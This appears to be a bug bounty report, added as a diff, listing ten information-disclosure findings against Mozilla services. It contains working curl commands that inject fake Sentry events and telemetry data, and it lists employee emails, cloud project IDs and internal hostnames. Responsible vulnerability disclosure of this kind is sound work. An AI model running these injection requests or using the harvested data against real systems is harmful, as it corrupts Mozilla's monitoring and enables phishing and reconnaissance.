@@ -1,0 +1,471 @@
+Mozilla Bug Bounty - Sensitive Information Disclosure Findings
+Target: Mozilla Web Properties (HackerOne)
+Tested: July 28, 2026
+
+
+Finding 1 - Sentry DSN Exposed and Accepts Arbitrary Event Injection (Medium)
+-------------------------------------------------------------------------------
+The mozilla.org homepage exposes a Sentry DSN in its client-side JavaScript.
+The DSN is publicly visible in the page source and the Sentry store endpoint
+accepts crafted error events from any origin with no authentication beyond
+the public DSN key.
+
+Exposed DSN:
+  https://c3ab8514873549d5b3785ebc7fb83c80@o1069899.ingest.sentry.io/6260331
+
+  Organization ID: o1069899
+  Project ID: 6260331
+  Public key: c3ab8514873549d5b3785ebc7fb83c80
+
+Proof of event injection:
+
+  curl -s -X POST "https://o1069899.ingest.sentry.io/api/6260331/store/" \
+    -H "Content-Type: application/json" \
+    -H "X-Sentry-Auth: Sentry sentry_version=7, sentry_key=c3ab8514873549d5b3785ebc7fb83c80, sentry_client=test/1.0" \
+    -d '{
+      "event_id": "00000000000000000000000000000001",
+      "message": "test event",
+      "level": "error",
+      "platform": "javascript"
+    }'
+
+  Response: {"id":"00000000000000000000000000000001"}
+
+The endpoint returns 200 with the event ID, confirming the event was accepted.
+Custom tags, fingerprints, user context, and arbitrary metadata can all be
+injected. The CORS headers on the ingest endpoint include:
+
+  access-control-allow-origin: *
+
+Impact: An attacker can flood Mozilla's Sentry dashboard with fake error
+events, inject misleading error data with custom stack traces and tags,
+trigger alert rules configured on error volume or new issue types, and
+make it harder for developers to distinguish real errors from injected
+noise. If Sentry alerts are connected to PagerDuty or on-call rotations,
+fake critical errors could trigger false incident responses.
+
+
+Finding 2 - Telemetry Pipeline Accepts Unauthenticated Arbitrary Data (Medium)
+--------------------------------------------------------------------------------
+The Firefox telemetry ingestion endpoint at incoming.telemetry.mozilla.org
+accepts POST requests with arbitrary JSON payloads for any product name
+and any document type. No authentication, no payload validation, no rate
+limiting observed.
+
+Proof:
+
+  curl -s -o /dev/null -w "%{http_code}" -X POST \
+    "https://incoming.telemetry.mozilla.org/submit/telemetry/test-id/main/Firefox/140.0/release/20260728" \
+    -H "Content-Type: application/json" \
+    -d '{"payload":{"arbitrary":"data"}}'
+
+  Response: 200
+
+Tested document types (all return 200):
+  main, crash, event, health, modules, new-profile, update
+
+Tested product names (all return 200):
+  telemetry (Firefox), focus, fenix, thunderbird, glean-test
+
+The URL path format is:
+  /submit/<namespace>/<doc-id>/<doc-type>/<app-name>/<app-version>/<channel>/<build-id>
+
+All path components accept arbitrary values. The endpoint returns 200 for
+every combination tested.
+
+Impact: An attacker can inject fake telemetry data into Mozilla's data
+pipeline. Mozilla uses telemetry data to make product decisions, track
+stability metrics, and monitor release health. Injected data could skew
+crash rates, fake usage metrics for specific features, or pollute the
+dataset used by data scientists. At scale, this could influence product
+decisions based on corrupted data.
+
+
+Finding 3 - TaskCluster Exposes Full CI/CD Infrastructure Configuration (Medium)
+----------------------------------------------------------------------------------
+Firefox CI TaskCluster (firefox-ci-tc.services.mozilla.com) exposes the
+complete CI/CD infrastructure configuration to anonymous users, including
+GCP project IDs, VM image names, worker configurations, employee email
+addresses, and the full organizational permission model.
+
+Exposed data:
+
+  A. GCP Project IDs:
+    - fxci-production-level3-workers (production code signing/release)
+    - taskcluster-imaging (VM image building)
+
+  B. VM Image Names with Build Dates:
+    Proof:
+    curl -s "https://firefox-ci-tc.services.mozilla.com/api/worker-manager/v1/worker-pool/adhoc-3%2Fdecision"
+
+    Response includes:
+      sourceImage: "projects/fxci-production-level3-workers/global/images/gw-fxci-gcp-l3-2404-amd64-headless-googlecompute-2026-05-04"
+
+    20 unique VM images exposed, revealing OS versions (Ubuntu 24.04),
+    architectures (amd64, arm64), build dates, and naming conventions.
+
+  C. GCP Regions (7 total):
+    us-central1, us-east1, us-west1, us-west-2, us-east-1,
+    northamerica-northeast1, us-west1
+
+  D. Worker Pool Configuration (390 pools):
+    Each pool exposes: machine types (n2-standard-2), disk sizes (75GB),
+    scheduling (SPOT instances), provisioning model, worker config
+    including generic-worker settings, sentry project names,
+    websocket tunnel URLs, and ed25519 signing key file paths.
+
+  E. Employee Email Addresses (9 unique):
+    aerickson@mozilla.com, jkratzer@mozilla.com, mdauer@mozilla.com,
+    truber@mozilla.com, release+tc-workers@mozilla.com, releng@mozilla.com,
+    relops-azure-provisioning@mozilla.com,
+    fuzzing+taskcluster@mozilla.com,
+    taskcluster-notifications+workers@mozilla.com
+
+  F. 986 Permission Roles:
+    Full role hierarchy with scope mappings, revealing the level-1/2/3
+    tiered trust model, which repos map to which privilege levels, and
+    how release-promotion, signing, and deployment scopes are structured.
+
+  G. 22 Hook Groups with 120+ Hooks:
+    Hook task templates reveal Docker image hashes, secret name
+    references (e.g., project/releng/mobile/github-cron-token),
+    notification email addresses, and cron schedules for release
+    automation.
+
+  H. 374 Secret Names (from prior finding, included for completeness):
+    Full list of secret names including API keys, database passwords,
+    OAuth tokens, SSH keys, and cloud credentials.
+
+Proof (GCP project + worker config):
+
+  curl -s "https://firefox-ci-tc.services.mozilla.com/api/worker-manager/v1/worker-pool/adhoc-3%2Fdecision" | python3 -c "
+  import json, sys
+  d = json.load(sys.stdin)
+  config = d['config']['launchConfigs'][0]
+  print(f'zone: {config[\"zone\"]}')
+  print(f'machineType: {config[\"machineType\"]}')
+  print(f'sourceImage: {config[\"disks\"][0][\"initializeParams\"][\"sourceImage\"]}')
+  print(f'provisioningModel: {config[\"scheduling\"][\"provisioningModel\"]}')
+  "
+
+  Output:
+    zone: us-central1-a
+    machineType: zones/us-central1-a/machineTypes/n2-standard-2
+    sourceImage: projects/fxci-production-level3-workers/global/images/gw-fxci-gcp-l3-2404-amd64-headless-googlecompute-2026-05-04
+    provisioningModel: SPOT
+
+Impact: This is a comprehensive infrastructure reconnaissance goldmine.
+An attacker gains: GCP project IDs for targeting cloud APIs, VM image
+names for identifying vulnerabilities in specific OS/software versions,
+the complete permission model for planning privilege escalation, employee
+emails for targeted phishing, secret naming conventions for targeting
+specific credentials, and release pipeline architecture for supply chain
+analysis. All without any authentication.
+
+
+Finding 4 - Bugzilla REST API Exposes Full Product/Component Taxonomy (Medium)
+-------------------------------------------------------------------------------
+The Bugzilla configuration endpoint at bugzilla.mozilla.org exposes the
+complete product and component structure, all custom field definitions,
+the maintainer email, all extension names/versions, and security group
+IDs without authentication.
+
+Proof:
+
+  curl -s "https://bugzilla.mozilla.org/rest/configuration" | python3 -c "
+  import json, sys
+  d = json.load(sys.stdin)
+  print(f'Products: {len(d[\"product\"])}')
+  print(f'Fields: {len(d[\"field\"])}')
+  print(f'Groups: {len(d[\"group\"])}')
+  print(f'Maintainer: {d[\"maintainer\"]}')
+  "
+
+  Output:
+    Products: 191
+    Fields: 1036
+    Groups: 40
+    Maintainer: bmo-mods@mozilla.com
+
+  curl -s "https://bugzilla.mozilla.org/rest/extensions"
+
+  Response: 44 extensions with version numbers, including:
+    GitHubAuth v0.01, PhabBugz v0.01, SecureMail v0.5,
+    Push v1, Webhooks v0, JiraWebhookSync v0
+
+  Security-relevant products exposed:
+    NSS (6 components), Security Assurance (4 components),
+    Enterprise Information Security (8 components)
+
+  Total: 191 products, 2,349 components, 1,036 field definitions
+
+  40 Security Group IDs exposed (numeric IDs):
+    2, 12, 14, 23, 26, 35, 45, 52, 53, 65, 84, 85, 86, 89, 95, 99,
+    105, 111, 125, 136, 138, 159, 163, 193, 195, 203, 206, 209, 214,
+    218, 223, 226, 244, 246, 247, 258, 271, 273, 278, 281
+
+Additionally, user lookup by known email works without auth:
+
+  curl -s "https://bugzilla.mozilla.org/rest/user?names=nobody@mozilla.org"
+
+  Response:
+    {"users":[{"nick":"nobody","name":"nobody@mozilla.org",
+    "real_name":"Nobody; OK to take it and work on it","id":1}]}
+
+Impact: The complete organizational taxonomy reveals what teams exist,
+what products are active vs. graveyard, which security groups are used,
+and all custom tracking fields. Extension versions (e.g., SecureMail
+v0.5, JiraWebhookSync v0) reveal integration points and potentially
+vulnerable addon versions. The 40 security group IDs could be used to
+probe for authorization bypass on restricted bugs.
+
+
+Finding 5 - All Mozilla Services Expose Version/Commit/Build Info (Low)
+------------------------------------------------------------------------
+Every major Mozilla service exposes a /__version__ endpoint that returns
+the exact commit hash, version number, source repository URL, and CI
+build URL. No authentication required on any of them.
+
+Proof:
+
+  addons.mozilla.org/__version__:
+    {"target":"production","version":"2026.07.23",
+     "source":"https://github.com/mozilla/addons-server",
+     "commit":"7b1a3cb4f596d2c6ceacc62f592bfcec03ba0a1b",
+     "build":"https://github.com/mozilla/addons-server/actions/runs/29908801150",
+     "python":"3.13","django":"5.2","addons-linter":"10.9.0"}
+
+  accounts.firefox.com/__version__:
+    {"commit":"1a8767cb1df84759841577d3219b6596c38702a1",
+     "version":"1.341.4",
+     "source":"https://github.com/mozilla/fxa-private"}
+
+  api.accounts.firefox.com/__version__:
+    {"version":"1.341.4",
+     "commit":"1a8767cb1df84759841577d3219b6596c38702a1",
+     "source":"https://github.com/mozilla/fxa-private"}
+
+  support.mozilla.org/__version__:
+    {"commit":"f93939908cdc83e198840ecdf69133b7fabaaee4",
+     "version":"1.7.19",
+     "source":"https://github.com/mozilla/kitsune",
+     "build":"https://github.com/mozilla/kitsune/actions/runs/29931205901"}
+
+  crash-stats.mozilla.org/__version__:
+    {"commit":"9c5526bf1a6d1599aedd41c502eb71d9e60f683a",
+     "version":"v2026.07.07",
+     "source":"https://github.com/mozilla-services/socorro",
+     "build":"https://github.com/mozilla-services/socorro/actions/runs/28894338074"}
+
+  location.services.mozilla.com/__version__:
+    {"commit":"125415e","version":"v2.3.7",
+     "source":"https://github.com/mozilla/classify-client",
+     "build":"https://github.com/mozilla/classify-client/actions/runs/28873236657"}
+
+Additional details exposed by addons.mozilla.org:
+  - Python version: 3.13
+  - Django version: 5.2
+  - addons-linter version: 10.9.0
+
+Impact: Exact commit hashes let an attacker diff the deployed code
+against the repository to identify recently patched vulnerabilities
+that may not yet be deployed. Framework and runtime versions (Python
+3.13, Django 5.2) allow targeting known CVEs. CI build URLs confirm
+the build pipeline. The FxA source references "fxa-private" which is
+a private repository, but the commit hash is still exposed allowing
+targeted attacks if the repo is ever made public or leaked.
+
+
+Finding 6 - AMO Admin Panel Redirects to Internal Hostname (Low)
+-----------------------------------------------------------------
+The addons.mozilla.org /admin/ path redirects to an internal hostname
+that reveals Mozilla's AWS infrastructure naming convention.
+
+Proof:
+
+  curl -sI "https://addons.mozilla.org/admin/"
+
+  Response:
+    HTTP/2 301
+    location: https://addons-internal.prod.mozaws.net/admin/
+
+The internal hostname reveals:
+  - Naming convention: addons-internal.prod.mozaws.net
+  - Environment: prod
+  - Infrastructure: mozaws.net (Mozilla AWS)
+
+Accessing the internal hostname directly:
+
+  curl -sI "https://addons-internal.prod.mozaws.net/admin/"
+
+  Response: HTTP/2 403
+
+The 403 (not 404) confirms the admin panel exists and is access-
+controlled, not removed.
+
+Impact: Internal hostname disclosure reveals infrastructure naming
+patterns. An attacker who gains network access (SSRF, VPN compromise)
+can target addons-internal.prod.mozaws.net directly. The .prod.
+component suggests staging/dev variants may exist at predictable
+hostnames (addons-internal.stage.mozaws.net, etc.).
+
+
+Finding 7 - Mercurial Pushlog Exposes Employee Email Addresses (Low)
+---------------------------------------------------------------------
+The Mercurial pushlog API at hg.mozilla.org exposes email addresses of
+every developer who has pushed code to Mozilla repositories. The data
+goes back to the earliest pushes and is accessible without authentication.
+
+Proof:
+
+  curl -sL "https://hg.mozilla.org/mozilla-central/json-pushes?startID=1&endID=3&full=1"
+
+  Response:
+    Push 2: user=jorendorff@mozilla.com
+      author: rhelmer@mozilla.com
+    Push 3: user=bsmedberg@mozilla.com
+      author: Benjamin Smedberg <benjamin@smedbergs.us>
+
+The CORS header on hg.mozilla.org is:
+
+  access-control-allow-origin: *
+
+This means any website can query the pushlog API via JavaScript and
+harvest all developer email addresses.
+
+Impact: Full email enumeration of Mozilla developers across all
+repositories. Useful for targeted phishing campaigns impersonating
+Mozilla infrastructure (CI notifications, code review requests).
+Combined with the FxA email enumeration finding, an attacker can
+check which developer emails have Firefox Accounts for further
+targeting.
+
+
+Finding 8 - FxA OAuth Client Details Publicly Queryable (Low)
+--------------------------------------------------------------
+Firefox Accounts OAuth client details are queryable by client ID without
+authentication, revealing application names and redirect URIs for all
+registered OAuth clients.
+
+Proof:
+
+  curl -s "https://oauth.accounts.firefox.com/v1/client/5882386c6d801776"
+
+  Response: client: Firefox, redirect: urn:ietf:wg:oauth:2.0:oob:oauth-redirect-webchannel
+
+  curl -s "https://oauth.accounts.firefox.com/v1/client/a2270f727f45f648"
+
+  Response: client: Firefox for Android, redirect: https://accounts.firefox.com/oauth/success/a2270f727f45f648
+
+  curl -s "https://oauth.accounts.firefox.com/v1/client/7f368c6886429f19"
+
+  Response: client: Notes, redirect: https://mozilla.github.io/notes/fxa/android-redirect.html
+
+Client IDs can be enumerated by brute-forcing the 16-character hex ID
+space or extracted from public source code and browser developer tools.
+
+Impact: Reveals all OAuth-integrated applications, their redirect URIs,
+and client IDs. An attacker can map the full FxA OAuth integration
+surface to identify targets for redirect_uri manipulation, token
+interception, or confused deputy attacks. The Notes redirect to
+mozilla.github.io is particularly interesting as GitHub Pages
+redirects may be manipulable.
+
+
+Finding 9 - Remote Settings Exposes Security Configuration Database (Info)
+---------------------------------------------------------------------------
+Firefox Remote Settings (firefox.settings.services.mozilla.com) exposes
+103 collections of browser configuration data pushed to all Firefox
+installations, including security-sensitive configurations.
+
+Proof:
+
+  curl -s "https://firefox.settings.services.mozilla.com/v1/buckets/main/collections"
+
+  Response: 103 collections
+
+  Security-sensitive collections exposed:
+    password-rules: password policy for specific domains
+    websites-with-shared-credential-backends: credential sharing relationships
+    hijack-blocklists: browser hijack detection patterns
+    query-stripping: tracking parameter removal rules
+    backup-common-passwords-list: password strength checking data
+    third-party-cookie-blocking-exempt-urls: cookie exception list
+    ml-inference-words-block-list: ML content filtering rules
+    addons-data-leak-blocker-domains: addon data exfiltration domains
+    change-password-urls: per-site password change URLs
+
+  Certificate/Security collections:
+    1,876 intermediate CA records in security-state/intermediates
+    4 blocklist collections (addons-bloomfilters, plugins, addons, gfx)
+
+  Sample password-rules record:
+    bkvenergy.com -> minlength: 8; maxlength: 12; required: upper, lower, digit
+
+  Sample addons-data-leak-blocker-domains:
+    cloudapi.stream, mines.cloudapi.stream, topup.cloudapi.stream,
+    analytics.urban-vpn.com, stats.urban-vpn.com
+
+Impact: Reveals Mozilla's security intelligence about which domains
+are considered malicious, which addons leak data, password requirements
+for specific websites, and the complete certificate trust chain. The
+data leak blocker domains list reveals Mozilla's threat intelligence
+about specific malicious infrastructure. The cookie exception list
+reveals which sites have negotiated special tracking exceptions.
+
+
+Finding 10 - SUMO Heartbeat Reports Service Health Status (Info)
+-----------------------------------------------------------------
+The support.mozilla.org health check endpoint reports backend service
+status to anonymous users.
+
+Proof:
+
+  curl -s "https://support.mozilla.org/__heartbeat__"
+
+  Response: {"status":"warning"}
+
+The "warning" status indicates a partial service degradation. This
+endpoint can be polled to monitor Mozilla's infrastructure health in
+real time.
+
+Impact: Operational intelligence about service health. Can be used to
+time attacks during degraded states or monitor infrastructure stability.
+
+
+Negative Findings (Properly Secured)
+-------------------------------------
+- Crash stats PII fields: email, url, user_comments, exploitability not
+  returned in anonymous SuperSearch API queries.
+
+- FxA attached_clients endpoint: requires authentication (401).
+
+- Bugzilla user search by match: blocked for anonymous users (error 505).
+
+- Bugzilla user lookup by ID: blocked for anonymous users (error 505).
+
+- Bugzilla security group details: blocked for anonymous users (410).
+
+- Pontoon GraphQL: not accessible without authentication. Returns page
+  not found for GET requests, requires CSRF for POST.
+
+- Pontoon admin panel: returns 403, properly access-controlled.
+
+- AMO internal admin: returns 403 at addons-internal.prod.mozaws.net.
+
+- TaskCluster secret values: returns 403 InsufficientScopes.
+
+- FxA API endpoints (api.accounts.firefox.com): no CORS headers at all.
+
+- Firefox Relay API: no CORS, requires auth.
+
+- Mozilla VPN API: all endpoints return 401, no CORS headers.
+
+- Remote Settings: read-only mode, write attempts produce no response.
+
+
+---
+
+All testing was curl-based from external network. No browser, no
+automated scanners, no authenticated testing. Used staging instances
+where instructed by program scope.
